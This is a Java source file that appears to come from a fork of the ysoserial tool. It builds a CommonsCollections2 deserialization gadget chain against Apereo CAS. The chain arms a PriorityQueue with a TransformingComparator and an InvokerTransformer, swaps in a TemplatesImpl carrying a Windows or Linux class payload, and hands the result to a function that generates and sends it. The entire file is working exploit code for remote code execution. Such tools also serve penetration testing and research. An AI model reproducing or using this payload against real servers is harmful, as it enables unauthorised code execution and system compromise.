package ysoserial.payloads;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysoserial.features.GenerateApereo;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.external.Apereo_linux;
import ysoserial.payloads.external.Apereo_win;
import ysoserial.payloads.util.Gadgets1;
import ysoserial.payloads.util.Gadgets2;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.util.HashMap;
import java.util.PriorityQueue;

// import ysoserial.features.GenerateApereo;


/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
public class apereo_CommonsCollections2 implements ObjectPayload<String> {
    public String getObject(HashMap<String, String> vars) throws Exception {
        String platform = vars.get("platform");
        Class classpayload = null;
        if (platform.startsWith("win")) {
            classpayload = Apereo_win.class;
        } else {
            classpayload = Apereo_linux.class;
        }
        final Object templates = Gadgets2.createTemplatesImpl(classpayload);


        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;

        // generate send payload
//        JsonSerializer jsonSerializer = new JsonSerializer();
//        String json = jsonSerializer.setClassMetadataName("class").deep(true).serialize(templates);
//        System.out.println(json);

        return GenerateApereo.sendpayload(queue);
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(apereo_CommonsCollections2.class, args);
    }

}
